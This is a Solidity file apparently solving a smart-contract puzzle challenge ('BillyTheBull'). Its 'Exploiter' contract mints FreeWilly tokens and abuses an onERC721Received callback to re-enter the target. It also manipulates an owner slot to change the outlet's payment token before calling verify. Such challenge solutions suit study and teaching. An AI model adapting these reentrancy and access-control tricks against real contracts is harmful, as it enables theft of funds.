// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { FreeWilly } from "../src/tokens/FreeWilly.sol";

interface Solver {
    function getMagicFlag(uint, uint, bytes32) external returns (bytes memory);
}

contract Exploiter {
    address owner;
    NFTOutlet nftOutlet;
    uint nftPrice;
    uint[1] _gap;
    bool flag;
    BillyTheBull immutable puzzle;
    address immutable willy;
    address immutable solver;
    uint immutable t1;
    uint immutable t2;
    bytes32 immutable salt;

    constructor(uint _t1, uint _t2, bytes32 _salt, address _puzzle, address _willy) {
        solver = msg.sender;
        t1 = _t1;
        t2 = _t2;
        salt = _salt;
        puzzle = BillyTheBull(_puzzle);
        nftOutlet = NFTOutlet(puzzle.nftOutlet());
        willy = _willy;

        uint indexToMint = puzzle.nftPrice();
        FreeWilly(willy).mint(indexToMint);
        FreeWilly(willy).mint(indexToMint + 1e18);
        FreeWilly(willy).setApprovalForAll(address(nftOutlet), true);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            uint solution = uint(keccak256(Solver(solver).getMagicFlag(t1, t2, salt)));
            puzzle.verify(t2 << 128 | t1, solution);
        }
        return this.onERC721Received.selector;
    }

    function getMagicFlag() external returns (bytes memory) {
        if (address(NFTOutlet(nftOutlet).paymentToken()) == willy) {
            return bytes("");
        } else {
            address oldOwner = owner;
            owner = address(this);
            nftOutlet.changePaymentToken(willy);
            owner = oldOwner;
            return Solver(solver).getMagicFlag(t1, t2, salt);
        }
    }
}
